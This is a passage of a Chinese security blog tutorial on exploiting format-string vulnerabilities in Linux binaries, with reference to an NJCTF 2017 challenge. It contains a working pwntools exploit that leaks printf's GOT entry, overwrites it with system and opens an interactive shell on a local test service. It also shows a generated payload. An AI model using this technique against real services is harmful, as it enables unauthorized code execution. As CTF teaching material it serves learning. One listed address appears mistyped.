+<p>利用过程中，第一个知识点: dump 内存数据，也就是上面的内容，得到bin后，可以很容易的获取到got表信息</p>
+<p>接下来第二个知识点就是获取<code>system</code>函数的地址，不过却需要爆破跑</p>
+<p>每次我首先获取<code>printf</code>函数的地址，然后再根据自己机子上<code>printf</code>和<code>system</code>函数之间的差值估测一个大概范围进行爆破，得到的数据和<code>system</code>函数中的一些特征数据进行对比，判断是否是system函数</p>
+<p>这一步跳过，现在假设自己有libc库，我本地的libc中，<code>printf</code>和<code>system</code>函数的差值为:<code>59600</code></p>
+<p>最后一步，就是通过格式化字符串内容进行写内存了，覆盖got表中的值</p>
+<p>这里我们可以使用pwntools神器:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = 'debug'</div><div class="line">printf_got = 0x804a010</div><div class="line">system_add = 0xaaaaaaaa</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">	p.sendline(payload)</div><div class="line">	return p.recv()</div><div class="line"></div><div class="line">p = remote(<span class="string">"127.0.0.1"</span>, 10001)</div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">payload = fmtstr_payload(autofmt.offset, &#123;printf_got: system_add&#125;)</div></pre></td></tr></table></figure>
+<p>上述代码中<code>autofmt = FmtStr(exec_fmt)</code>到这行的内容之前都讲过，接下来就是<code>fmtstr_payload</code>函数，这个函数的作用是用来生成格式化字符串漏洞写内存的payload.</p>
+<p>上述代码的第一个参数为offset偏移，第二个参数是一个字典，意义是往key的地址，写入value的值，也就是往<code>0x804a010</code>地址写入数据<code>0xaaaaaaaa</code></p>
+<p>我们来看看输出的payload:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">&gt;&gt;&gt; payload = fmtstr_payload(autofmt.offset, &#123;printf_got: system_add&#125;)</div><div class="line">&gt;&gt;&gt; payload</div><div class="line">'\<span class="keyword">x</span><span class="number">10</span>\xa<span class="number">0</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">11</span>\xa<span class="number">0</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">12</span>\xa<span class="number">0</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">13</span>\xa<span class="number">0</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="symbol">%154</span><span class="keyword">c</span><span class="symbol">%11</span>$hhn<span class="symbol">%12</span>$hhn<span class="symbol">%13</span>$hhn<span class="symbol">%14</span>$hhn'</div></pre></td></tr></table></figure></p>
+<p>开头16bytes是4个地址:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>x<span class="number">0804a010</span></div><div class="line"><span class="number">0</span>x<span class="number">0804a011</span></div><div class="line"><span class="number">0</span>x<span class="number">0804a012</span></div><div class="line"><span class="number">0</span>x<span class="number">8004a012</span></div></pre></td></tr></table></figure></p>
+<p>然后是格式化字符串:<code>%154c</code>, 输出hex(154)==0x9a bytes的字符，再加上之前的16bytes地址，一共有0xaa bytes</p>
+<p>第三部分也是格式化字符串: <code>%11$hhn%12$hhn%13$hhn%14$hhn</code>，往第11, 12, 13, 14个参数指向的地址写入一个值，该值等于之前输出的byte数，在这里就是0xaa</p>
+<p>而偏移值为11, 所以第11个参数为payload头，也就是<code>0x0804a010</code>，然后以此类推</p>
+<p>就是通过上述逻辑往相应地址写入相应值的</p>
+<p>所以可以写出exp:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = 'debug'</div><div class="line"></div><div class="line">p = remote(<span class="string">"127.0.0.1"</span>, 10001)</div><div class="line"></div><div class="line"><span class="comment"># 获取printf的libc地址</span></div><div class="line">printf_got = 0x804a010</div><div class="line">leak_payload = <span class="string">"b%13$saa"</span> + p32(printf_got)</div><div class="line"></div><div class="line">p.sendline(leak_payload)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"b"</span>)</div><div class="line">info = p.recvuntil(<span class="string">"aa"</span>)[:-2]</div><div class="line">print info.encode('hex')</div><div class="line"></div><div class="line"><span class="comment"># 计算system的libc地址</span></div><div class="line">print_add = u32(info[:4])</div><div class="line">p_s_offset = 59600     <span class="comment"># addr(printf) - addr(system)</span></div><div class="line">system_add = print_add - p_s_offset</div><div class="line"></div><div class="line"><span class="comment"># 生成payload</span></div><div class="line">payload = fmtstr_payload(11, &#123;printf_got: system_add&#125;)</div><div class="line"></div><div class="line"><span class="comment"># 发送payload</span></div><div class="line">p.sendline(payload)</div><div class="line">p.sendline('/bin/sh')</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在前几天的NJCTF中有一个pingme的PWN题就是没有源码的格式化字符串漏洞.</p>
+<p>二进制文件我拖下来了在: <a href="https://github.com/Hcamael/CTF_repo/tree/master/NJCTF%202017/Pwn200(pingme)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/NJCTF%202017/Pwn200(pingme)</a></p>
+<p>有兴趣的可以自己搭个环境试试看，该题就是只有一个远程可访问的服务，没有bin和libc，不过这题的libc可以通过别的题获取到，所以也可以算是已知libc的题</p>
+<p>思路同我上面demo所讲.</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2017-03-13, 15:39:33</p>
+        <p><span>最后更新:</span>2017-03-14, 13:22:20</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/13/0x2c/" title="Linux系统下格式化字符串利用研究">http://0x48.pw/2017/03/13/0x2c/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/03/13/0x2c/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2017/03/14/0x2d/">
+                    栈溢出之绕过CANARY保护
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/01/17/0x2b/">
+                    Pwnhub之深入敌后writeup
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Leak-Memory"><span class="toc-number">1.</span> <span class="toc-text">Leak Memory</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write"><span class="toc-number">2.</span> <span class="toc-text">Write</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/03/14/0x2d/" title="上一篇: 栈溢出之绕过CANARY保护">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/01/17/0x2b/" title="下一篇: Pwnhub之深入敌后writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
